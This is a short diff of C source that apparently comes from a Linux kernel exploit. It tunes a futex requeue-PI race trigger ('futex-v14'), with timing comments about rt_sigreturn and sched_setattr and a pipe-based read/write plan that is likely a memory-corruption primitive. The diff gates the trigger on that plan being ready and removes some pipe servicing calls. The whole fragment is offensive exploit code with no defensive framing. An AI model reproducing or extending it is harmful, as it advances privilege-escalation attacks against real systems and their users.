@@ -2697,12 +2697,16 @@ static void *owner_thread_fn_v14(void *arg) {
 
 int run_futex_trigger_v14_cb(futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
+  if (!oss_pipe_rw_plan_ready()) {
+    fprintf(stderr,
+            "[futex-v14] blocked before thread creation: pipe_plan.ready=0\n");
+    return 0;
+  }
   g_futex_dbg_t0 = futex_now_ms();
   g_futex_dbg_last = g_futex_dbg_t0;
   g_futex_wait_sec = futex_env_int_clamped("FUTEX_WAIT_SEC", WAIT_SEC, 1, WAIT_SEC);
   fprintf(stderr, "[futex-v14] FUTEX_WAIT_SEC=%d (default %d)\n",
           g_futex_wait_sec, WAIT_SEC);
-  oss_pipe_rw_reset();
   /* Resolve environment/libc work before either critical thread exists.
    * The consumer path after the waiter's rt_sigreturn must contain no
    * getenv/atoi calls before sched_setattr. */
@@ -2806,10 +2810,8 @@ int run_futex_trigger_v14_cb(futex_post_trigger_cb post_trigger_cb,
   futex_v14_dbg("post-cmp-requeue-pi");
 
   while (!atomic_load(&g_v14_state.route_done)) {
-    oss_pipe_rw_service_pending();
     usleep(TARGET_FUTEX_RETRY_USEC);
   }
-  oss_pipe_rw_service_pending();
   futex_v14_dbg("route-done");
 
   fprintf(stderr, "[futex-v14] cmp_requeue_pi ret=%ld errno=%d\n",
